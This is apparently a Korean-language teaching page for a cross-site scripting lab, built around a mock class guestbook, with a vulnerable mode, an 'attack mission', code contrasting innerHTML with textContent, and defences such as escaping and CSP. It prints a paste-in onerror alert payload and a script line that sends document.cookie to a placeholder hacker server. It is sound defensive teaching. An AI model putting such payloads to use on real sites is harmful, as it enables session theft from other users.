XSS 크로스 사이트 스크립팅

게시판에 글을 쓸 때, 글 내용에 <script> 같은 코드를 넣으면 그걸 읽는 사람의 브라우저에서 코드가 실행돼요. 댓글, 닉네임, 프로필 등 "남이 쓴 글"을 화면에 그대로 보여주는 모든 곳이 위험할 수 있습니다.

모의 사이트 · "우리 반 방명록"

✍️ 방명록에 글 남기기

🔓 지금은 입력값을 그대로 화면에 출력합니다. 코드가 실행돼요!
🔒 지금은 입력값을 이스케이프 처리합니다. 코드가 글자로만 보여요.
📋 방명록
아직 글이 없어요. 위에서 글을 남겨보세요!

🎯 공격 미션

메시지 칸에 아래를 복사해서 붙여넣고 글을 남겨보세요. (취약한 버전에서)

<img src=x onerror="alert('해킹당함!')">

경고창이 뜨면 성공! 이건 애교 수준이고, 진짜 공격은 이렇게 쿠키를 훔쳐요:

// 실제 공격자는 이런 식으로 로그인 정보(쿠키)를 외부로 전송합니다
<script>fetch('http://해커서버/'+document.cookie)</script>
왜 위험할까? 방명록 글은 다른 사람도 보게 돼요. 내가 심어둔 코드가 선생님 브라우저에서 실행되면, 선생님의 로그인 정보가 통째로 넘어갈 수 있습니다.

🔍 무슨 차이일까?

🔓 취약한 코드
// 입력을 HTML로 그대로 삽입 → 코드가 "실행"됨
box.innerHTML += "<div>" + name + ": " + msg + "</div>";
🔒 방어된 코드
// 입력을 "글자"로만 삽입 → < 는 그냥 꺾쇠 기호로 보임
box.textContent = name + ": " + msg;
// 또는 escapeHtml()로 < > 를 &lt; &gt; 로 변환
핵심 방어법
① 출력할 때 textContent 사용 (innerHTML 금지)
② 서버에서 < > " ' 특수문자를 이스케이프
③ Content-Security-Policy 헤더로 외부 스크립트 차단

🏁 플래그 획득!

XSS 공격에 성공했어요. 스크립트가 실제로 실행된 걸 확인했습니다.
